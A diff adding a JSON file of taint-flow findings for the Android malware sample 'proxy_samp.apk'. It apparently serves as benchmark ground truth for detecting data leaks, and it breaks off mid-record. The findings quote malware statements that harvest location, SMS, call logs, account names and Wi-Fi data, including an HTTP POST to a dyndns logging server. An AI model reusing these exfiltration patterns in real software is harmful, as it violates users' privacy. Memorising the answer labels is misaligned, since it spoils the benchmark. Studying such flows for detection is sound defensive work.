@@ -1,0 +1,1295 @@
+{
+  "fileName": "proxy_samp.apk",
+  "day": "2019-07-25",
+  "findings": [
+    {
+      "source": {
+        "statement": "this.LAC = location.getLac();",
+        "methodName": "public void run()",
+        "className": "com.smart.studio.proxy.ProxyService.PollerThread",
+        "lineNo": 739,
+        "targetName": "getLac",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$i0 = virtualinvoke $r17.<android.telephony.gsm.GsmCellLocation: int getLac()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "Log.i(\"proxy\", \"cid=\" + this.CID + \",lac=\" + this.LAC + \",mcc=\" + this.MCC + \",mnc=\" + this.MNC);",
+        "methodName": "public void run()",
+        "className": "com.smart.studio.proxy.ProxyService.PollerThread",
+        "lineNo": 742,
+        "targetName": "i",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "staticinvoke <android.util.Log: int i(java.lang.String,java.lang.String)>(\"proxy\", $r18)"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "attributes": {
+        "appendToString": true,
+        "nonStaticField": true,
+        "threading": true
+      },
+      "ID": 1,
+      "description": "This flow logs location information.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "this.LAC = location.getLac();",
+        "methodName": "public void run()",
+        "className": "com.smart.studio.proxy.ProxyService.PollerThread",
+        "lineNo": 739,
+        "targetName": "getLac",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$i0 = virtualinvoke $r17.<android.telephony.gsm.GsmCellLocation: int getLac()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "HttpResponse response = client.execute(post);",
+        "methodName": "public void run()",
+        "className": "com.smart.studio.proxy.ProxyService.PollerThread",
+        "lineNo": 769,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r21 = interfaceinvoke $r4.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r7)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "tower.put(\"location_area_code\", this.LAC);",
+          "methodName": "public void run()",
+          "className": "com.smart.studio.proxy.ProxyService.PollerThread",
+          "lineNo": 758,
+          "ID": 1
+        },
+        {
+          "statement": "towerarray.put(tower);",
+          "methodName": "public void run()",
+          "className": "com.smart.studio.proxy.ProxyService.PollerThread",
+          "lineNo": 763,
+          "ID": 2
+        },
+        {
+          "statement": "holder.put(\"cell_towers\", towerarray);",
+          "methodName": "public void run()",
+          "className": "com.smart.studio.proxy.ProxyService.PollerThread",
+          "lineNo": 764,
+          "ID": 3
+        },
+        {
+          "statement": "post.setEntity(new StringEntity(holder.toString()));",
+          "methodName": "public void run()",
+          "className": "com.smart.studio.proxy.ProxyService.PollerThread",
+          "lineNo": 767,
+          "ID": 4
+        }
+      ],
+      "attributes": {
+        "collections": true,
+        "nonStaticField": true,
+        "threading": true
+      },
+      "ID": 2,
+      "description": "This malicious flow reads location information and writes its into a private field, then sends it to a remote server per an HTTP POST request.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "File out = new File(Environment.getExternalStorageDirectory(), \"ProxyLog.out\");",
+        "methodName": "public void run()",
+        "className": "com.smart.studio.proxy.ProxyService.ProxyThread",
+        "lineNo": 838,
+        "targetName": "File",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "specialinvoke $r4.<java.io.File: void <init>(java.io.File,java.lang.String)>($r6, \"ProxyLog.out\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);",
+        "methodName": "public void run()",
+        "className": "com.smart.studio.proxy.ProxyService.ProxyThread",
+        "lineNo": 854,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r13 = virtualinvoke $r12.<org.apache.http.impl.client.DefaultHttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r2)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "BufferedReader in = new BufferedReader(new FileReader(out.getAbsolutePath()));",
+          "methodName": "public void run()",
+          "className": "com.smart.studio.proxy.ProxyService.ProxyThread",
+          "lineNo": 839,
+          "ID": 1
+        },
+        {
+          "statement": "String s = in.readLine();",
+          "methodName": "public void run()",
+          "className": "com.smart.studio.proxy.ProxyService.ProxyThread",
+          "lineNo": 844,
+          "ID": 2
+        },
+        {
+          "statement": "params.add(new BasicNameValuePair(\"l\" + i, s));",
+          "methodName": "public void run()",
+          "className": "com.smart.studio.proxy.ProxyService.ProxyThread",
+          "lineNo": 847,
+          "ID": 3
+        },
+        {
+          "statement": "httpRequest.setEntity(new UrlEncodedFormEntity(params, \"UTF-8\"));",
+          "methodName": "public void run()",
+          "className": "com.smart.studio.proxy.ProxyService.ProxyThread",
+          "lineNo": 853,
+          "ID": 4
+        }
+      ],
+      "attributes": {
+        "collections": true,
+        "pathConstraints": true,
+        "threading": true
+      },
+      "ID": 3,
+      "description": "This malicious flow reads a log file from external storage line by line and sends the content to a remote server. Each line of the file is written to an ArrayList. This ArrayList is used to construct the HTTP entity which will be sent to a remote server.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "for (Account account : AccountManager.get(this).getAccounts()) {",
+        "methodName": "public void onCreate()",
+        "className": "com.smart.studio.proxy.ProxyService",
+        "lineNo": -1,
+        "targetName": "getAccounts",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r9 = virtualinvoke $r8.<android.accounts.AccountManager: android.accounts.Account[] getAccounts()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "out.write(logStr.toString());",
+        "methodName": "private void LogToFile()",
+        "className": "com.smart.studio.proxy.ProxyService",
+        "lineNo": 280,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r3.<java.io.BufferedWriter: void write(java.lang.String)>($r7)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "LogFile(\"account,\" + account.name + \",\" + account.type);",
+          "methodName": "public void onCreate()",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 324,
+          "ID": 1
+        },
+        {
+          "statement": "logStr.append(dateFormatter.format(Calendar.getInstance().getTime()) + \",\" + logstr + \"\\r\\n\");",
+          "methodName": "public static void LogFile(String logstr)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 270,
+          "ID": 2
+        },
+        {
+          "statement": "public void onDestroy() {",
+          "methodName": "public int onStartCommand(Intent intent, int flags, int startId)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 521,
+          "ID": 3
+        },
+        {
+          "statement": "LogToFile();",
+          "methodName": "public void onDestroy()",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 524,
+          "ID": 4
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "lifecycle": true,
+        "nonStaticField": true,
+        "staticField": true
+      },
+      "ID": 4,
+      "description": "This malicious flow reads account information and writes it to a log file.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "for (Account account : AccountManager.get(this).getAccounts()) {",
+        "methodName": "public void onCreate()",
+        "className": "com.smart.studio.proxy.ProxyService",
+        "lineNo": -1,
+        "targetName": "getAccounts",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r9 = virtualinvoke $r8.<android.accounts.AccountManager: android.accounts.Account[] getAccounts()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "out.write(logStr.toString());",
+        "methodName": "private void LogToFile()",
+        "className": "com.smart.studio.proxy.ProxyService",
+        "lineNo": 280,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r3.<java.io.BufferedWriter: void write(java.lang.String)>($r7)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "if (account.name.contains(\"@gmail.com\")) {",
+          "methodName": "public void onCreate()",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 325,
+          "ID": 1
+        },
+        {
+          "statement": "this.myID = account.name;",
+          "methodName": "public void onCreate()",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 327,
+          "ID": 2
+        },
+        {
+          "statement": "LogFile(\"id,\" + this.myID + \",\" + this.myIMEI);",
+          "methodName": "public void onCreate()",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 340,
+          "ID": 3
+        },
+        {
+          "statement": "logStr.append(dateFormatter.format(Calendar.getInstance().getTime()) + \",\" + logstr + \"\\r\\n\");",
+          "methodName": "public static void LogFile(String logstr)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 270,
+          "ID": 4
+        },
+        {
+          "statement": "LogFile(\"id,\" + this.myID + \",\" + this.myIMEI);",
+          "methodName": "public void onCreate()",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 340,
+          "ID": 5
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "lifecycle": true,
+        "nonStaticField": true,
+        "pathConstraints": true,
+        "staticField": true
+      },
+      "ID": 5,
+      "description": "This malicious flow reads account information and writes gmail acount into a private field. The gmail acount name will be logged into a file.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "cur = getContentResolver().query(uriSMSURI, null, \"date>\" + lastSMSTime, null, \"date\");",
+        "methodName": "public void QuerySMSLog(boolean first)",
+        "className": "com.smart.studio.proxy.ProxyService",
+        "lineNo": 586,
+        "targetName": "query",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r3.<android.content.ContentResolver: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>($r2, null, $r5, null, \"date\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "out.write(logStr.toString());",
+        "methodName": "private void LogToFile()",
+        "className": "com.smart.studio.proxy.ProxyService",
+        "lineNo": 280,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r3.<java.io.BufferedWriter: void write(java.lang.String)>($r7)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "int index_Body = cur.getColumnIndex(\"body\");",
+          "methodName": "public void QuerySMSLog(boolean first)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 591,
+          "ID": 1
+        },
+        {
+          "statement": "String strbody = cur.getString(index_Body);",
+          "methodName": "public void QuerySMSLog(boolean first)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 598,
+          "ID": 2
+        },
+        {
+          "statement": "LogFile(\"sms,in,\" + strAddress + \",\" + strDate + \",\" + strbody);",
+          "methodName": "public void QuerySMSLog(boolean first)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 609,
+          "ID": 3
+        },
+        {
+          "statement": "logStr.append(dateFormatter.format(Calendar.getInstance().getTime()) + \",\" + logstr + \"\\r\\n\");",
+          "methodName": "public static void LogFile(String logstr)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 270,
+          "ID": 4
+        },
+        {
+          "statement": "LogToFile();",
+          "methodName": "public void onDestroy()",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 524,
+          "ID": 6
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "lifecycle": true,
+        "staticField": true
+      },
+      "ID": 6,
+      "description": "This malicious flow reads sms from database and writes it a log file.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "WifiInfo wi = mWiFiManager.getConnectionInfo();",
+        "methodName": "public int onStartCommand(Intent intent, int flags, int startId)",
+        "className": "com.smart.studio.proxy.ProxyService",
+        "lineNo": 412,
+        "targetName": "getConnectionInfo",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r10 = virtualinvoke $r9.<android.net.wifi.WifiManager: android.net.wifi.WifiInfo getConnectionInfo()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "Log.i(\"proxy\", \"\\\"\" + logstr + \"\\\"\");",
+        "methodName": "public static void LogFile(String logstr)",
+        "className": "com.smart.studio.proxy.ProxyService",
+        "lineNo": 268,
+        "targetName": "i",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "staticinvoke <android.util.Log: int i(java.lang.String,java.lang.String)>(\"proxy\", $r3)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "s = new StringBuilder(String.valueOf(s)).append(\",SSID=\").append(wi.getSSID()).toString();",
+          "methodName": "public int onStartCommand(Intent intent, int flags, int startId)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 414,
+          "ID": 1
+        },
+        {
+          "statement": "LogFile(s);",
+          "methodName": "public int onStartCommand(Intent intent, int flags, int startId)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 416,
+          "ID": 2
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "lifecycle": true
+      },
+      "ID": 7,
+      "description": "This malicious flow reads wifi connection information and logs it.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "msgBody = new StringBuilder(String.valueOf(msgBody)).append(smsMsgs[i].getDisplayMessageBody()).toString();",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.smart.studio.proxy.SMSReceiver",
+        "lineNo": 29,
+        "targetName": "getDisplayMessageBody",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r9 = virtualinvoke $r13.<android.telephony.SmsMessage: java.lang.String getDisplayMessageBody()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "Log.i(\"proxy\", \"\\\"\" + logstr + \"\\\"\");",
+        "methodName": "public static void LogFile(String logstr)",
+        "className": "com.smart.studio.proxy.ProxyService",
+        "lineNo": 268,
+        "targetName": "i",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "staticinvoke <android.util.Log: int i(java.lang.String,java.lang.String)>(\"proxy\", $r3)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "if (!ProxyService.receivedSMS(context, sendAddr, dateFormatter.format(time), msgBody)) {",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.smart.studio.proxy.SMSReceiver",
+          "lineNo": 35,
+          "ID": 1
+        },
+        {
+          "statement": "LogFile(\"sms,in,\" + sendAddr + \",\" + msgTime + \",\" + msgBody);",
+          "methodName": "public static boolean receivedSMS(Context context, String sendAddr, String msgTime, String msgBody)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 151,
+          "ID": 2
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "array": true,
+        "lifecycle": true,
+        "pathConstraints": true
+      },
+      "ID": 8,
+      "description": "This malicious flow starts in a BroadcastReceiver. It reads sms message and logs it.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "for (Account account : AccountManager.get(this).getAccounts()) {",
+        "methodName": "public void onCreate()",
+        "className": "com.smart.studio.proxy.ProxyService",
+        "lineNo": -1,
+        "targetName": "getAccounts",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r9 = virtualinvoke $r8.<android.accounts.AccountManager: android.accounts.Account[] getAccounts()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "Log.i(\"proxy\", \"\\\"\" + logstr + \"\\\"\");",
+        "methodName": "public static void LogFile(String logstr)",
+        "className": "com.smart.studio.proxy.ProxyService",
+        "lineNo": 268,
+        "targetName": "i",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "staticinvoke <android.util.Log: int i(java.lang.String,java.lang.String)>(\"proxy\", $r3)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "LogFile(\"account,\" + account.name + \",\" + account.type);",
+          "methodName": "public void onCreate()",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 324,
+          "ID": 1
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "array": true,
+        "lifecycle": true,
+        "nonStaticField": true
+      },
+      "ID": 9,
+      "description": "This malicious flow logs account information on the device.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "for (Account account : AccountManager.get(this).getAccounts()) {",
+        "methodName": "public void onCreate()",
+        "className": "com.smart.studio.proxy.ProxyService",
+        "lineNo": -1,
+        "targetName": "getAccounts",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r9 = virtualinvoke $r8.<android.accounts.AccountManager: android.accounts.Account[] getAccounts()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);",
+        "methodName": "public void run()",
+        "className": "com.smart.studio.proxy.ProxyService.ProxyThread",
+        "lineNo": 854,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r13 = virtualinvoke $r12.<org.apache.http.impl.client.DefaultHttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r2)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "if (account.name.contains(\"@gmail.com\")) {",
+          "methodName": "public void onCreate()",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 325,
+          "ID": 1
+        },
+        {
+          "statement": "this.myID = account.name;",
+          "methodName": "public void onCreate()",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 327,
+          "ID": 2
+        },
+        {
+          "statement": "HttpPost httpRequest = new HttpPost(\"http://proxylog.dyndns.org/proxy/log.php?id=\" + URLEncoder.encode(ProxyService.this.myID, \"UTF-8\"));",
+          "methodName": "public void run()",
+          "className": "com.smart.studio.proxy.ProxyService.ProxyThread",
+          "lineNo": 852,
+          "ID": 3
+        }
+      ],
+      "attributes": {
+        "array": true,
+        "lifecycle": true,
+        "nonStaticField": true,
+        "pathConstraints": true,
+        "threading": true
+      },
+      "ID": 10,
+      "description": "This malicious flow sends Google account name to a remote server via a HTTP POST request.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "msgBody = new StringBuilder(String.valueOf(msgBody)).append(smsMsgs[i].getDisplayMessageBody()).toString();",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.smart.studio.proxy.SMSReceiver",
+        "lineNo": 29,
+        "targetName": "getDisplayMessageBody",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r9 = virtualinvoke $r13.<android.telephony.SmsMessage: java.lang.String getDisplayMessageBody()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "out.write(logStr.toString());",
+        "methodName": "private void LogToFile()",
+        "className": "com.smart.studio.proxy.ProxyService",
+        "lineNo": 280,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r3.<java.io.BufferedWriter: void write(java.lang.String)>($r7)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "if (!ProxyService.receivedSMS(context, sendAddr, dateFormatter.format(time), msgBody)) {",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.smart.studio.proxy.SMSReceiver",
+          "lineNo": 35,
+          "ID": 1
+        },
+        {
+          "statement": "LogFile(\"sms,in,\" + sendAddr + \",\" + msgTime + \",\" + msgBody);",
+          "methodName": "public static boolean receivedSMS(Context context, String sendAddr, String msgTime, String msgBody)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 151,
+          "ID": 2
+        },
+        {
+          "statement": "logStr.append(dateFormatter.format(Calendar.getInstance().getTime()) + \",\" + logstr + \"\\r\\n\");",
+          "methodName": "public static void LogFile(String logstr)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 270,
+          "ID": 3
+        },
+        {
+          "statement": "LogToFile();",
+          "methodName": "public void onDestroy()",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 524,
+          "ID": 4
+        },
+        {
+          "statement": "if (logStr.length() > 0) {",
+          "methodName": "private void LogToFile()",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 288,
+          "ID": 5
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "lifecycle": true,
+        "pathConstraints": true,
+        "staticField": true
+      },
+      "ID": 11,
+      "description": "This malicious flow reads incomming SMS message and writes to a log file. ",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "WifiInfo wi = mWiFiManager.getConnectionInfo();",
+        "methodName": "public int onStartCommand(Intent intent, int flags, int startId)",
+        "className": "com.smart.studio.proxy.ProxyService",
+        "lineNo": 412,
+        "targetName": "getConnectionInfo",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r10 = virtualinvoke $r9.<android.net.wifi.WifiManager: android.net.wifi.WifiInfo getConnectionInfo()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "out.write(logStr.toString());",
+        "methodName": "private void LogToFile()",
+        "className": "com.smart.studio.proxy.ProxyService",
+        "lineNo": 280,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r3.<java.io.BufferedWriter: void write(java.lang.String)>($r7)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "if (wi != null) {",
+          "methodName": "public int onStartCommand(Intent intent, int flags, int startId)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 413,
+          "ID": 1
+        },
+        {
+          "statement": "s = new StringBuilder(String.valueOf(s)).append(\",SSID=\").append(wi.getSSID()).toString();",
+          "methodName": "public int onStartCommand(Intent intent, int flags, int startId)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 414,
+          "ID": 2
+        },
+        {
+          "statement": "LogFile(s);",
+          "methodName": "public int onStartCommand(Intent intent, int flags, int startId)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 416,
+          "ID": 3
+        },
+        {
+          "statement": "logStr.append(dateFormatter.format(Calendar.getInstance().getTime()) + \",\" + logstr + \"\\r\\n\");",
+          "methodName": "public static void LogFile(String logstr)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 270,
+          "ID": 4
+        },
+        {
+          "statement": "LogToFile();",
+          "methodName": "public void onDestroy()",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 524,
+          "ID": 5
+        },
+        {
+          "statement": "if (logStr.length() > 0) {",
+          "methodName": "private void LogToFile()",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 288,
+          "ID": 6
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "lifecycle": true,
+        "pathConstraints": true,
+        "staticField": true
+      },
+      "ID": 12,
+      "description": "This malicious flow reads WIFI information and writes to a log file.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "cur = getContentResolver().query(uriSMSURI, null, \"date>\" + lastSMSTime, null, \"date\");",
+        "methodName": "public void QuerySMSLog(boolean first)",
+        "className": "com.smart.studio.proxy.ProxyService",
+        "lineNo": 586,
+        "targetName": "query",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r3.<android.content.ContentResolver: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>($r2, null, $r5, null, \"date\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "Log.i(\"proxy\", \"\\\"\" + logstr + \"\\\"\");",
+        "methodName": "public static void LogFile(String logstr)",
+        "className": "com.smart.studio.proxy.ProxyService",
+        "lineNo": 268,
+        "targetName": "i",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "staticinvoke <android.util.Log: int i(java.lang.String,java.lang.String)>(\"proxy\", $r3)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "int index_Body = cur.getColumnIndex(\"body\");",
+          "methodName": "public void QuerySMSLog(boolean first)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 591,
+          "ID": 1
+        },
+        {
+          "statement": "String strbody = cur.getString(index_Body);",
+          "methodName": "public void QuerySMSLog(boolean first)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 598,
+          "ID": 2
+        },
+        {
+          "statement": "LogFile(\"sms,in,\" + strAddress + \",\" + strDate + \",\" + strbody);",
+          "methodName": "public void QuerySMSLog(boolean first)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 609,
+          "ID": 3
+        }
+      ],
+      "attributes": {
+        "appendToString": true
+      },
+      "ID": 13,
+      "description": "This malicious flow logs incoming SMS messages. ",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "targetName": "query",
+        "targetNo": 1,
+        "statement": "cur = getContentResolver().query(uri, null, \"date>\" + lastPhoneTime, null, \"date\");",
+        "methodName": "public void QueryPhoneLog(boolean first)",
+        "className": "com.smart.studio.proxy.ProxyService",
+        "lineNo": 635,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r3.<android.content.ContentResolver: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>($r1, null, $r6, null, \"date\")"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "write",
+        "targetNo": 1,
+        "statement": "out.write(logStr.toString());",
+        "methodName": "private void LogToFile()",
+        "className": "com.smart.studio.proxy.ProxyService",
+        "lineNo": 280,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r3.<java.io.BufferedWriter: void write(java.lang.String)>($r7)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "int index_Number = cur.getColumnIndex(\"number\");",
+          "methodName": "public void QueryPhoneLog(boolean first)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 638,
+          "ID": 1
+        },
+        {
+          "statement": "String strNumber = cur.getString(index_Number);",
+          "methodName": "public void QueryPhoneLog(boolean first)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 646,
+          "ID": 2
+        },
+        {
+          "statement": "s = new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(s)).append(strNumber).append(\",\").append(strName).append(\",\").append(strDate).append(\",\").toString())).append(longDuration / 60).append(':').toString();",
+          "methodName": "public void QueryPhoneLog(boolean first)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 674,
+          "ID": 3
+        },
+        {
+          "statement": "if (ds < 10) {",
+          "methodName": "public void QueryPhoneLog(boolean first)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 676,
+          "ID": 4
+        },
+        {
+          "statement": "s = new StringBuilder(String.valueOf(s)).append('0').toString();",
+          "methodName": "public void QueryPhoneLog(boolean first)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 677,
+          "ID": 5
+        },
+        {
+          "statement": "LogFile(new StringBuilder(String.valueOf(s)).append(ds).toString());",
+          "methodName": "public void QueryPhoneLog(boolean first)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 679,
+          "ID": 6
+        },
+        {
+          "statement": "logStr.append(dateFormatter.format(Calendar.getInstance().getTime()) + \",\" + logstr + \"\\r\\n\");",
+          "methodName": "public static void LogFile(String logstr)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 270,
+          "ID": 7
+        },
+        {
+          "statement": "LogToFile();",
+          "methodName": "public void onDestroy()",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 524,
+          "ID": 8
+        }
+      ],
+      "description": "This malicious flow saves phone call logs to a log file when the ProxyService is destoryed. This file will be later uploaded to a remote server",
+      "isNegative": false,
+      "attributes": {
+        "lifecycle": true,
+        "pathConstraints": true,
+        "appendToString": true,
+        "staticField": true,
+        "partialFlow": true
+      },
+      "ID": 14
+    },
+    {
+      "source": {
+        "targetName": "query",
+        "targetNo": 1,
+        "statement": "cur = getContentResolver().query(uri, null, null, null, \"date DESC\");",
+        "methodName": "public void QueryPhoneLog(boolean first)",
+        "className": "com.smart.studio.proxy.ProxyService",
+        "lineNo": 633,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r4 = virtualinvoke $r3.<android.content.ContentResolver: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>($r1, null, null, null, \"date DESC\")"
+          }
+        ]
+      },
+      "sink": {
+        "targetName": "write",
+        "targetNo": 1,
+        "statement": "out.write(logStr.toString());",
+        "methodName": "private void LogToFile()",
+        "className": "com.smart.studio.proxy.ProxyService",
+        "lineNo": 280,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r3.<java.io.BufferedWriter: void write(java.lang.String)>($r7)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "int index_Name = cur.getColumnIndex(\"name\");",
+          "methodName": "public void QueryPhoneLog(boolean first)",
+          "className": "com.smart.studio.proxy.ProxyService",
+          "lineNo": 639,
+          "ID": 1
+        },
+        {
